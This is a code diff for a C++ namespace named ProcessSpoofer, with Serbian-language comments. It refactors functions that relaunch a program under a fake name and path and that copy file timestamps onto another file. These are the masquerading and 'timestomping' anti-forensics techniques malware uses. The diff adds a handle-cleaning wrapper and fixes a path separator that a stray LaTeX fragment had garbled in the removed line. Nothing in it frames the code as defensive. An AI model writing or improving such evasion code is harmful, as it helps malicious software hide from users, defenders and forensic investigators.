@@ -5,6 +5,24 @@
 
 namespace ProcessSpoofer {
 
+    // RAII omotač za automatsko upravljanje HANDLE-ovima
+    class HandleGuard {
+    public:
+        explicit HandleGuard(HANDLE handle = INVALID_HANDLE_VALUE) : m_handle(handle) {}
+        ~HandleGuard() {
+            if (m_handle != INVALID_HANDLE_VALUE) {
+                CloseHandle(m_handle);
+            }
+        }
+        // Onemogući kopiranje
+        HandleGuard(const HandleGuard&) = delete;
+        HandleGuard& operator=(const HandleGuard&) = delete;
+
+        HANDLE get() const { return m_handle; }
+    private:
+        HANDLE m_handle;
+    };
+
     bool SpoofProcess(const char* newName, const char* newPath) {
         // 1. Dobijanje putanje do trenutnog izvršnog fajla
         char currentPath[MAX_PATH];
@@ -13,7 +31,7 @@ namespace ProcessSpoofer {
         }
 
         // 2. Formiranje nove putanje
-        std::string newFullPath = std::string(newPath) + "\includegraphics[width=0.5em]{/}" + std::string(newName);
+        std::string newFullPath = std::string(newPath) + "\\" + std::string(newName);
 
         // Ako smo već pokrenuti sa lažne putanje, ne radi ništa
         if (_stricmp(currentPath, newFullPath.c_str()) == 0) {
@@ -53,32 +71,25 @@ namespace ProcessSpoofer {
     }
 
     bool TimeStampStomp(const char* targetFile, const char* sourceFile) {
-        HANDLE hSource = CreateFileA(sourceFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
-        if (hSource == INVALID_HANDLE_VALUE) {
+        HandleGuard hSource(CreateFileA(sourceFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL));
+        if (hSource.get() == INVALID_HANDLE_VALUE) {
             return false;
         }
 
-        HANDLE hTarget = CreateFileA(targetFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
-        if (hTarget == INVALID_HANDLE_VALUE) {
-            CloseHandle(hSource);
+        HandleGuard hTarget(CreateFileA(targetFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL));
+        if (hTarget.get() == INVALID_HANDLE_VALUE) {
             return false;
         }
 
         FILETIME ftCreate, ftAccess, ftWrite;
-        if (!GetFileTime(hSource, &ftCreate, &ftAccess, &ftWrite)) {
-            CloseHandle(hSource);
-            CloseHandle(hTarget);
+        if (!GetFileTime(hSource.get(), &ftCreate, &ftAccess, &ftWrite)) {
             return false;
         }
 
-        if (!SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite)) {
-            CloseHandle(hSource);
-            CloseHandle(hTarget);
+        if (!SetFileTime(hTarget.get(), &ftCreate, &ftAccess, &ftWrite)) {
             return false;
         }
 
-        CloseHandle(hSource);
-        CloseHandle(hTarget);
-        return true;
+        return true; // Handle-ovi se automatski zatvaraju preko HandleGuard destruktora
     }
 }
